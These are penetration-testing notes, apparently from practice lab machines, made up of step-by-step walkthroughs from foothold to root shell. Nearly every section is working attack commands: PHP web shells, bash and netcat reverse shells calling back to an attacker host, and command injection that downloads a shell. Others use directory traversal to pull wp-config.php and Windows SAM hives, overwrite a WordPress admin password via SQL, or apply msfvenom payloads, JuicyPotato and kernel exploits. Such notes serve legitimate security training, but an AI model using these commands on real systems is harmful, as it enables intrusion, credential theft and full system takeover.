# Webshell LFI RFI Directory Traversal
## Exploit to Getting User
1. Port 8787 is an http service
2. Check robots.txt and you should get a hidden directory
3. Credential admin:admin
4. Follow https://www.exploit-db.com/exploits/42003 and upload a CSV file
5. Capture the POST request using Burp and edit the file name to <?php echo exec(‘nc -lvnp
9000 > shell.php 2>&1’); ?>.php
6. In your local machine, transfer the shell.php to target machine by running nc -nv 192.168.XX.53
9000 < shell.php
7. Start a netcat listener to your machine and browse
http://192.168.XX.53:8787/2315e8131432505230f581cf689e783a/shell.php
8. User shell!

## Arbitrary file upload
1. Port 481 Directory Bruteforce the site to find /build
2. It is a BuilderEngine 3.5.0 - Arbitrary File Uploadhttps://www.exploit-db.com/exploits/40390
3. Modify the action attribute to point it to target machine
4. Upload PHP Shell
5. Access it on https://192.168.XX.150:481/build/files/shell.php
6. Root shell!

## Exploit in Getting root
1. Machine is vulnerable to https://www.exploit-db.com/exploits/46307
2. Run python 46307.py 192.168.XX.152 7337 “touch /tmp/f; rm /tmp/f; mkfifo /tmp/f; cat
/tmp/f | nc 192.168.XX.XX 1337 > /tmp/f”
3. Root shell!

## Exploit in Getting User
1. Go to Port 4080 and login as admin:admin
2. Command Injection in http://192.168.XX.95:4080/ping_router.php?cmd=1.1.1.1
3. Create php reverse shell -
<?php exec("bash -c 'bash -i >& /dev/tcp/192.168.XX.XX/80 0>&1'"); ?>
4. Start a web server: python -m SimpleHTTPServer 80
5. Upload it via command injection -
http://192.168.XX.95:4080/ping_router.php?cmd=1.1.1.1;wget+192.168.XX.XX/shell.php
6. Start Listener - nc -lvnp 80
7. Browser http://192.168.XX.95:4080/shell.php
8. User shell!

## Exploit in Getting User
1. Gobuster the port 8081 - gobuster -u http://192.168.XX.46:8081 -w
/opt/SecLists/Discovery/Web-Content/common.txt -x txt,php,asp,db
2. CyBroHttpServer 1.0.3 is vulnerable to Directory Traversal -
https://www.exploit-db.com/exploits/45303
3. http://192.168.XX.46:8081/..\..\..\..\xampp\htdocs\blog\wp-config.php
4. Get the credential & Connect to MySQL - mysql -u root -h 192.168.XX.46 -p
5. Use wordpress database and select * from wp_users
6. Run UPDATE `wp_users` SET `user_pass`= MD5('bypassed') WHERE
`user_login`='admin';
7. Login to http://192.168.XX.46/blog/wp-admin/
8. Go to Theme Editor and edit 404.php
9. Use PHP Reverse Shell and listen to your machine
10. User shell!

## Exploits in Getting User
1. Simple nmap will show /dashboard so directory brute force that
2. LFI in
compontents/filemanager/download.php?path=../../../../../../../../../../xampp/security/webda
v.htpasswd
3. Brute force the hash: john --wordlist=rockyou.txt hash.txt
4. Upload netcat: curl --user 'wampp:iamdifferent' -Tnc.exe
http://192.168.XX.55/webdav/nc.exe
5. Upload the reverse shell using the same process above: <?php echo($_GET[‘cmd’]);?>
6. Start a netcat listener
7. curl --user 'wampp:iamdifferent'
http://192.168.XX.55/webdav/cmd.php?cmd=nc+-e+cmd.exe+192.168.XX.XX+53
8. User Shell!

## Exploit in Getting User
1. Port 8081 is running FreeSWITCH
2. Use this exploit: https://www.exploit-db.com/exploits/47799
3. Copy the exploit and modify the file extension from txt to py
4. Run: python3 47799.py 192.168.XX.105 dir
5. dir is a command in windows =.=
6. Next step is to upload a netcat binary. For this one use Powershell
7. Execute reverse shell using netcat: python3 47799.py 192.168.XX.105 “.\nc.exe -nv
192.168.XX.XX 445 -e cmd.exe”
8. User shell!

## Steps to Root
1. Machine is vulnerable to https://www.exploit-db.com/exploits/46307
2. Run python 46307.py 192.168.XX.152 7337 “touch /tmp/f; rm /tmp/f; mkfifo /tmp/f; cat
/tmp/f | nc 192.168.XX.XX 1337 > /tmp/f”
3. Root shell!
![image](https://github.com/user-attachments/assets/7db2ea17-9a6a-483f-88da-701184437574)

## Steps to Root
1. Find the port for website
2. It is vulnerable to Directory Traversal and LFIhttps://www.exploit-db.com/exploits/23318
3. Get the SAM - wget
http://192.168.XX.161/..%5C..%5C..%5C..%5C..%5CWindows..%5CSystem32..%5Ccon
fig..%5CRegBack..%5CSAM.OLD -O sam.old
4. Get the SYSTEM - wget
http://192.168.XX.161/..%5C..%5C..%5C..%5C..%5CWindows..%5CSystem32..%5Ccon
fig..%5CRegBack..%5CSYSTEM.OLD -O system.old
5. pwdump system.old sam.old and you will get the Hashes
6. Brute it with john
7. Login to RDP
8. Root shell!


# Win Priv Esc 
## Potato 1
Privilege Escalation to Root
1. Machine is using a Windows 10 Pro and the SeImpersonatePrivilege is enabled.
2. Download JuicyPotato - https://github.com/ohpe/juicy-potato
3. Upload a netcat binary to target machine and run the command:
echo C:\Users\Rob\Desktop\nc.exe 192.168.123.123 12345 -e cmd.exe > rev.bat
4. Setup netcat listener in your local machine
5. Go to https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Pro and copy a CLSID
6. Run JuicyPotato.exe -l 12345 -p C:\Users\Rob\Desktop\rev.bat -t * -c
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
7. Root shell!

## Potato 2 
1. The machine is running Windows Server 2009 and the SeImpersonatePrivilege is
enabled.
2. Download JuicyPotato - https://github.com/ohpe/juicy-potato and send it to target
machine
3. Upload a nc binary to target machine and run the command: echo
C:/GitStack/gitphp/nc.exe 192.168.XX.43 1338 -c cmd.exe > rev.bat
4. Find CLSID for Windows Server 2019
5. Run JuicyPotato.exe -l 1338 -p C:\GitStack\gitphp\rev.bat -t * -c
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
6. Root shell!

## Scheduled Task/Job
1. A System Scheduler service is installed in the machine located at C:\Program
Files\SystemScheduler\WScheduler.exe and vulnerable to
https://www.exploit-db.com/exploits/45072
2. Its permission is Everyone [WriteData/CreateFiles] and it will automatically run in startup
because HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
3. Create an exe file using msfvenom - msfvenom -p windows/shell_reverse_tcp
LHOST=192.168.XX.XX LPORT=443 -f exe -a x86 --platform win > WScheduler.exe
4. Backup the original schedule in the target machine - move "C:\Program
Files\SystemScheduler\WScheduler.exe" "C:\Program
Files\SystemScheduler\WScheduler.back"
5. Copy your reverse shell to target machine - copy \\192.168.XX.XX\LOVE\WScheduler.exe
"C:\Program Files\SystemScheduler\"
6. Restart the target machine - shutdown /R
7. Root shell!

## SeCreateTokenPrivilege
1. Vulnerable to SeCreateTokenPrivilege
2. Follow https://www.greyhathacker.net/?p=1025
3. Root shell!

## unquoted service path
1. Use winPEAS to gather info and look for a vulnerable service name.
2. The machine has a vulnerable service path (Unquoted Service Path)
3. Rename the existing service
4. Create a reverse shell (exe) in msfvenom
5. Upload it to the path folder of the service
6. Setup netcat listener
7. Reboot the target machine
8. Root!

# Linux Priv Esc
## SUID 1
Privilege Escalation to Root
1. Run Linux Enumeration and you should find SUID named NfsEn
2. Check for its version because it is vuln to https://github.com/patrickfreed/nfsen-exploit
3. Root shell!

## SUID 2
1. Run Linux Enumeration script
2. You will see it has systemctl
3. /var/www/html/assets/images/ is writable
4. Follow this -
https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl
-permissions-bc62b0b28d49
5. Root shell!

## Sudo -l
1. Run sudo -l
2. Check the version of nagios - /usr/local/nagios/bin/nagios --version
3. Nagios is vulnerable to Root Privilege Escalation -
https://gist.github.com/xl7dev/322b0f85dc9f6a06573302c7de4f4249
4. Run the exploit - bash nagios-root-privesc.sh /usr/local/nagios/var/nagios.log
5. Root shell!

## Kernel exploit
1. Machine Kernel is vulnerable to https://www.exploit-db.com/exploits/45010
2. wget http://x.x.x.x:143/45010.c -O /tmp/45010.c
3. gcc /tmp/45010.c -o /tmp/45010
4. ./tmp/45010
5. Root shell!

